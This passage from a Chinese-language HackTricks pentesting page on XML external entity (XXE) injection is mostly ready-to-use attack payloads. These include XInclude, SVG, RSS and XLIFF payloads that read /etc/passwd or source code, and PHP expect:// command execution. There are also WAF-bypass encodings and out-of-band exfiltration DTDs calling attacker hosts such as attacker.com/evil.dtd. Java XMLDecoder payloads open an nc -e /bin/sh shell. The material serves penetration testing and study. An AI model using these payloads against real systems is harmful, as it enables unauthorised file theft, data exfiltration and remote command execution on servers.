<pre><code class="language-xml">productId=&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;&amp;storeId=1
</code></pre>
<p>检查 <a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a> 以获取更多信息！</p>
<h3 id="svg---文件上传"><a class="header" href="#svg---文件上传">SVG - 文件上传</a></h3>
<p>用户上传到某些应用程序的文件，在服务器上处理时，可能会利用 XML 或包含 XML 的文件格式处理中的漏洞。常见的文件格式如办公文档 (DOCX) 和图像 (SVG) 基于 XML。</p>
<p>当用户 <strong>上传图像</strong> 时，这些图像会在服务器端进行处理或验证。即使对于期望 PNG 或 JPEG 格式的应用程序，<strong>服务器的图像处理库也可能支持 SVG 图像</strong>。由于 SVG 是基于 XML 的格式，攻击者可以利用这一点提交恶意 SVG 图像，从而使服务器暴露于 XXE（XML 外部实体）漏洞。</p>
<p>下面展示了一个此类攻击的示例，其中恶意 SVG 图像试图读取系统文件：</p>
<pre><code class="language-xml">&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"&gt;&lt;image xlink:href="file:///etc/hostname"&gt;&lt;/image&gt;&lt;/svg&gt;
</code></pre>
<p>另一种方法涉及尝试通过 PHP "expect" 包装器 <strong>执行命令</strong>：</p>
<pre><code class="language-xml">&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"&gt;
&lt;image xlink:href="expect://ls"&gt;&lt;/image&gt;
&lt;/svg&gt;
</code></pre>
<p>在这两种情况下，SVG 格式被用来发起攻击，利用服务器软件的 XML 处理能力，突显了强大输入验证和安全措施的必要性。</p>
<p>查看 <a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a> 获取更多信息！</p>
<p><strong>注意，读取文件的第一行或执行结果将出现在创建的图像内部。因此，您需要能够访问 SVG 创建的图像。</strong></p>
<h3 id="pdf---文件上传"><a class="header" href="#pdf---文件上传"><strong>PDF - 文件上传</strong></a></h3>
<p>阅读以下帖子以<strong>了解如何利用 XXE 上传 PDF</strong> 文件：</p>
<p>{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
<a href="file-upload/pdf-upload-xxe-and-cors-bypass.html">pdf-upload-xxe-and-cors-bypass.md</a>
{% endcontent-ref %}</p>
<h3 id="content-type-从-x-www-urlencoded-到-xml"><a class="header" href="#content-type-从-x-www-urlencoded-到-xml">Content-Type: 从 x-www-urlencoded 到 XML</a></h3>
<p>如果 POST 请求接受 XML 格式的数据，您可以尝试在该请求中利用 XXE。例如，如果正常请求包含以下内容：</p>
<pre><code class="language-xml">POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
</code></pre>
<p>然后您可能能够提交以下请求，结果相同：</p>
<pre><code class="language-xml">POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;foo&gt;bar&lt;/foo&gt;
</code></pre>
<h3 id="content-type-从-json-到-xee"><a class="header" href="#content-type-从-json-到-xee">Content-Type: 从 JSON 到 XEE</a></h3>
<p>要更改请求，您可以使用一个名为“<strong>Content Type Converter</strong>”的 Burp 扩展。 <a href="https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html">这里</a> 您可以找到这个例子：</p>
<pre><code class="language-xml">Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
</code></pre>
<pre><code class="language-xml">Content-Type: application/xml;charset=UTF-8

&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;
&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" &gt;]&gt;
&lt;root&gt;
&lt;root&gt;
&lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;
&lt;lastName/&gt;
&lt;country&gt;United States&lt;/country&gt;
&lt;city&gt;ddd&lt;/city&gt;
&lt;postalCode&gt;ddd&lt;/postalCode&gt;
&lt;/root&gt;
&lt;/root&gt;
</code></pre>
<p>另一个例子可以在 <a href="https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2">这里</a> 找到。</p>
<h2 id="waf-和保护绕过"><a class="header" href="#waf-和保护绕过">WAF 和保护绕过</a></h2>
<h3 id="base64"><a class="header" href="#base64">Base64</a></h3>
<pre><code class="language-xml">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"&gt; %init; ]&gt;&lt;foo/&gt;
</code></pre>
<p>这仅在 XML 服务器接受 <code>data://</code> 协议时有效。</p>
<h3 id="utf-7"><a class="header" href="#utf-7">UTF-7</a></h3>
<p>您可以在此处使用 [<strong>"Encode Recipe</strong>" of cyberchef ]([<a href="https://gchq.github.io/CyberChef/#recipe=Encode_text%28&#x27;UTF-7">https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7</a> %2865000%29'%29&amp;input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to](<a href="https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&amp;input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to">https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7 %2865000%29'%29&amp;input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to</a>) 转换为 UTF-7。</p>
<pre><code class="language-xml">&lt;!xml version="1.0" encoding="UTF-7"?--&gt;
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
</code></pre>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-7"?&gt;
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
</code></pre>
<h3 id="file-协议绕过"><a class="header" href="#file-协议绕过">File:/ 协议绕过</a></h3>
<p>如果网站使用 PHP，可以使用 <strong>php wrappers</strong> <code>php://filter/convert.base64-encode/resource=</code> 来 <strong>访问内部文件</strong>。</p>
<p>如果网站使用 Java，您可以检查 <a href="xxe-xee-xml-external-entity.html#jar-protocol"><strong>jar: 协议</strong></a>。</p>
<h3 id="html-实体"><a class="header" href="#html-实体">HTML 实体</a></h3>
<p>来自 <a href="https://github.com/Ambrotd/XXE-Notes"><strong>https://github.com/Ambrotd/XXE-Notes</strong></a><br />
您可以创建一个 <strong>实体内部的实体</strong>，通过 <strong>html 实体</strong> 编码，然后调用它来 <strong>加载 dtd</strong>。<br />
请注意，使用的 <strong>HTML 实体</strong> 需要是 <strong>数字</strong>（如 [在这个例子中](<a href="https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&amp;input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C">https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,'Numeric entities'%29&amp;input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\</a>).</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % a "&amp;#x3C;&amp;#x21;&amp;#x45;&amp;#x4E;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x25;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4D;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x6F;&amp;#x75;&amp;#x72;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x65;&amp;#x72;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6D;&amp;#x2F;&amp;#x62;&amp;#x79;&amp;#x70;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x2E;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x3E;" &gt;%a;%dtd;]&gt;
&lt;data&gt;
&lt;env&gt;&amp;exfil;&lt;/env&gt;
&lt;/data&gt;
</code></pre>
<p>DTD 示例：</p>
<pre><code class="language-xml">&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag"&gt;
&lt;!ENTITY % abt "&lt;!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'&gt;"&gt;
%abt;
%exfil;
</code></pre>
<h2 id="php-wrappers"><a class="header" href="#php-wrappers">PHP Wrappers</a></h2>
<h3 id="base64-1"><a class="header" href="#base64-1">Base64</a></h3>
<p><strong>提取</strong> <em><strong>index.php</strong></em></p>
<pre><code class="language-xml">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt; ]&gt;
</code></pre>
<h4 id="提取外部资源"><a class="header" href="#提取外部资源"><strong>提取外部资源</strong></a></h4>
<pre><code class="language-xml">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"&gt; ]&gt;
</code></pre>
<h3 id="远程代码执行"><a class="header" href="#远程代码执行">远程代码执行</a></h3>
<p><strong>如果加载了 PHP "expect" 模块</strong></p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
</code></pre>
<h2 id="soap---xee"><a class="header" href="#soap---xee"><strong>SOAP - XEE</strong></a></h2>
<pre><code class="language-xml">&lt;soap:Body&gt;&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;&lt;/foo&gt;&lt;/soap:Body&gt;
</code></pre>
<h2 id="xliff---xxe"><a class="header" href="#xliff---xxe">XLIFF - XXE</a></h2>
<p>这个例子灵感来源于 <a href="https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe">https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe</a></p>
<p>XLIFF（XML本地化交换文件格式）用于标准化本地化过程中的数据交换。它是一种基于XML的格式，主要用于在本地化过程中在工具之间传输可本地化数据，并作为计算机辅助翻译（CAT）工具的通用交换格式。</p>
<h3 id="blind-request-analysis"><a class="header" href="#blind-request-analysis">Blind Request Analysis</a></h3>
<p>向服务器发送了以下内容的请求：</p>
<pre><code class="language-xml">------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE XXE [
&lt;!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"&gt; %remote; ]&gt;
&lt;xliff srcLang="en" trgLang="ms-MY" version="2.0"&gt;&lt;/xliff&gt;
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
</code></pre>
<p>然而，这个请求触发了一个内部服务器错误，特别提到标记声明的问题：</p>
<pre><code class="language-json">{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
</code></pre>
<p>尽管出现错误，但在 Burp Collaborator 上记录了一次命中，表明与外部实体有某种程度的交互。</p>
<p>带外数据泄露 为了泄露数据，发送了一个修改过的请求：</p>
<pre><code>------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE XXE [
&lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt; %remote; ]&gt;
&lt;xliff srcLang="en" trgLang="ms-MY" version="2.0"&gt;&lt;/xliff&gt;
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
</code></pre>
<p>这种方法表明用户代理指示使用Java 1.8。这个版本的Java的一个显著限制是无法使用带外技术检索包含换行符的文件，例如/etc/passwd。</p>
<p>基于错误的数据外泄 为了克服这个限制，采用了基于错误的方法。DTD文件的结构如下，以触发包含目标文件数据的错误：</p>
<pre><code class="language-xml">&lt;!ENTITY % data SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % foo "&lt;!ENTITY &amp;#37; xxe SYSTEM 'file:///nofile/'&gt;"&gt;
%foo;
%xxe;
</code></pre>
<p>服务器返回一个错误，重要的是反映了不存在的文件，表明服务器正在尝试访问指定的文件：</p>
<pre><code class="language-javascript">{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
</code></pre>
<p>要在错误消息中包含文件的内容，DTD 文件被调整：</p>
<pre><code class="language-xml">&lt;!ENTITY % data SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % foo "&lt;!ENTITY &amp;#37; xxe SYSTEM 'file:///nofile/%data;'&gt;"&gt;
%foo;
%xxe;
</code></pre>
<p>此修改导致文件内容的成功外泄，因为它反映在通过HTTP发送的错误输出中。这表明成功进行了XXE（XML外部实体）攻击，利用了带外和基于错误的技术来提取敏感信息。</p>
<h2 id="rss---xee"><a class="header" href="#rss---xee">RSS - XEE</a></h2>
<p>有效的XML格式为RSS，以利用XXE漏洞。</p>
<h3 id="ping-back"><a class="header" href="#ping-back">Ping back</a></h3>
<p>简单的HTTP请求到攻击者服务器</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;
&lt;!ENTITY xxe SYSTEM "http://&lt;AttackIP&gt;/rssXXE" &gt;]&gt;
&lt;rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"&gt;
&lt;channel&gt;
&lt;title&gt;XXE Test Blog&lt;/title&gt;
&lt;link&gt;http://example.com/&lt;/link&gt;
&lt;description&gt;XXE Test Blog&lt;/description&gt;
&lt;lastBuildDate&gt;Mon, 02 Feb 2015 00:00:00 -0000&lt;/lastBuildDate&gt;
&lt;item&gt;
&lt;title&gt;&amp;xxe;&lt;/title&gt;
&lt;link&gt;http://example.com&lt;/link&gt;
&lt;description&gt;Test Post&lt;/description&gt;
&lt;author&gt;author@example.com&lt;/author&gt;
&lt;pubDate&gt;Mon, 02 Feb 2015 00:00:00 -0000&lt;/pubDate&gt;
&lt;/item&gt;
&lt;/channel&gt;
&lt;/rss&gt;
</code></pre>
<h3 id="读取文件-1"><a class="header" href="#读取文件-1">读取文件</a></h3>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
&lt;rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"&gt;
&lt;channel&gt;
&lt;title&gt;The Blog&lt;/title&gt;
&lt;link&gt;http://example.com/&lt;/link&gt;
&lt;description&gt;A blog about things&lt;/description&gt;
&lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;
&lt;item&gt;
&lt;title&gt;&amp;xxe;&lt;/title&gt;
&lt;link&gt;http://example.com&lt;/link&gt;
&lt;description&gt;a post&lt;/description&gt;
&lt;author&gt;author@example.com&lt;/author&gt;
&lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;
&lt;/item&gt;
&lt;/channel&gt;
&lt;/rss&gt;
</code></pre>
<h3 id="读取源代码"><a class="header" href="#读取源代码">读取源代码</a></h3>
<p>使用 PHP base64 过滤器</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;
&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" &gt;]&gt;
&lt;rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"&gt;
&lt;channel&gt;
&lt;title&gt;The Blog&lt;/title&gt;
&lt;link&gt;http://example.com/&lt;/link&gt;
&lt;description&gt;A blog about things&lt;/description&gt;
&lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;
&lt;item&gt;
&lt;title&gt;&amp;xxe;&lt;/title&gt;
&lt;link&gt;http://example.com&lt;/link&gt;
&lt;description&gt;a post&lt;/description&gt;
&lt;author&gt;author@example.com&lt;/author&gt;
&lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;
&lt;/item&gt;
&lt;/channel&gt;
&lt;/rss&gt;
</code></pre>
<h2 id="java-xmldecoder-xee-to-rce"><a class="header" href="#java-xmldecoder-xee-to-rce">Java XMLDecoder XEE to RCE</a></h2>
<p>XMLDecoder 是一个 Java 类，它根据 XML 消息创建对象。如果恶意用户能够让应用程序在调用 <strong>readObject</strong> 方法时使用任意数据，他将立即获得服务器上的代码执行权限。</p>
<h3 id="using-runtimeexec"><a class="header" href="#using-runtimeexec">Using Runtime().exec()</a></h3>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java version="1.7.0_21" class="java.beans.XMLDecoder"&gt;
&lt;object class="java.lang.Runtime" method="getRuntime"&gt;
&lt;void method="exec"&gt;
&lt;array class="java.lang.String" length="6"&gt;
&lt;void index="0"&gt;
&lt;string&gt;/usr/bin/nc&lt;/string&gt;
&lt;/void&gt;
&lt;void index="1"&gt;
&lt;string&gt;-l&lt;/string&gt;
&lt;/void&gt;
&lt;void index="2"&gt;
&lt;string&gt;-p&lt;/string&gt;
&lt;/void&gt;
&lt;void index="3"&gt;
&lt;string&gt;9999&lt;/string&gt;
&lt;/void&gt;
&lt;void index="4"&gt;
&lt;string&gt;-e&lt;/string&gt;
&lt;/void&gt;
&lt;void index="5"&gt;
&lt;string&gt;/bin/sh&lt;/string&gt;
&lt;/void&gt;
&lt;/array&gt;
&lt;/void&gt;
&lt;/object&gt;
&lt;/java&gt;
</code></pre>
<h3 id="processbuilder"><a class="header" href="#processbuilder">ProcessBuilder</a></h3>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java version="1.7.0_21" class="java.beans.XMLDecoder"&gt;
&lt;void class="java.lang.ProcessBuilder"&gt;
&lt;array class="java.lang.String" length="6"&gt;
&lt;void index="0"&gt;
&lt;string&gt;/usr/bin/nc&lt;/string&gt;
&lt;/void&gt;
&lt;void index="1"&gt;
&lt;string&gt;-l&lt;/string&gt;
&lt;/void&gt;
&lt;void index="2"&gt;
&lt;string&gt;-p&lt;/string&gt;
&lt;/void&gt;
&lt;void index="3"&gt;
&lt;string&gt;9999&lt;/string&gt;
&lt;/void&gt;
&lt;void index="4"&gt;
&lt;string&gt;-e&lt;/string&gt;
&lt;/void&gt;
&lt;void index="5"&gt;
&lt;string&gt;/bin/sh&lt;/string&gt;
&lt;/void&gt;
&lt;/array&gt;
&lt;void method="start" id="process"&gt;
&lt;/void&gt;
&lt;/void&gt;
&lt;/java&gt;
</code></pre>
<h2 id="工具"><a class="header" href="#工具">工具</a></h2>
<p>{% embed url="https://github.com/luisfontes19/xxexploiter" %}</p>
<h2 id="参考资料"><a class="header" href="#参考资料">参考资料</a></h2>
<ul>
<li><a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf">https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf</a>\</li>
<li><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a>\</li>
<li>通过 HTTP 使用自定义外部 DTD 提取信息: <a href="https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/">https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/</a>\</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection</a>\</li>
<li><a href="https://gist.github.com/staaldraad/01415b990939494879b4">https://gist.github.com/staaldraad/01415b990939494879b4</a>\</li>
<li><a href="https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9">https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9</a>\</li>
<li><a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a>\</li>
<li><a href="https://gosecure.github.io/xxe-workshop/#7">https://gosecure.github.io/xxe-workshop/#7</a></li>
</ul>
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/xss-cross-site-scripting/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/xss-cross-site-scripting/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
